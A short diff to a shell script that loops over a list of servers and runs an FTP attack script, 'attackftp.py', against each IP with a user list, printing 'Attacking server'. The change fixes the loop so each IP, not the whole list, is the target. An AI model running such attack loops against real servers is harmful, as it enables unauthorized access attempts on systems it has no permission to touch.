@@ -15,7 +15,7 @@ count=0
 while  ! [ true -a  $count -gt $duration ];do 
 	
 	for ip in $server;do
-		python attackftp.py -t $server -p users
+		python attackftp.py -t $ip -p users
 		sleep 1
 		echo " "
 		echo "Attacking server $ip"
